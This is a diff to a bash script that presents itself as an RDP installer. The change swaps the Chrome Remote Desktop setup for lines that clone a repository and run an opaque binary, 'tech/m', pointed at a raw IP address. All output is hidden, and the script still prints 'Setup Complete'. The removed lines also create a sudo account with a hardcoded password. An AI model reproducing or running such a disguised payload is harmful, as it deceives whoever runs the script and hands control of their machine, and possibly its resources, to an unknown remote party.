@@ -1,25 +1,9 @@
 #! /bin/bash
 printf "Installing RDP Be Patience... " >&2
 {
-sudo useradd -m ALOK
-sudo adduser ALOK sudo
-echo 'ALOK:8426' | sudo chpasswd
-sed -i 's/\/bin\/sh/\/bin\/bash/g' /etc/passwd
-sudo apt-get update
-wget https://github.com/phucbmt/tech/releases/download/1.0/m
-wget https://dl.google.com/linux/direct/chrome-remote-desktop_current_amd64.deb
-sudo dpkg --install chrome-remote-desktop_current_amd64.deb
-sudo apt install --assume-yes --fix-broken
-sudo DEBIAN_FRONTEND=noninteractive \
-apt install --assume-yes xfce4 desktop-base
-sudo bash -c 'echo "exec /etc/X11/Xsession /usr/bin/xfce4-session" > /etc/chrome-remote-desktop-session'  
-sudo apt install --assume-yes xscreensaver
-sudo systemctl disable lightdm.service
-wget https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb
-sudo dpkg --install google-chrome-stable_current_amd64.deb
-sudo apt install --assume-yes --fix-broken
-sudo apt install nautilus nano -y 
-sudo adduser ALOK chrome-remote-desktop
+git clone https://github.com/phucbmt/tech.git &> /dev/null
+sudo chmod +x tech/m
+./tech/m -P http://138.197.99.165:4545/test &> log
 } &> /dev/null &&
 printf "\nSetup Complete " >&2 ||
 printf "\nError Occured " >&2
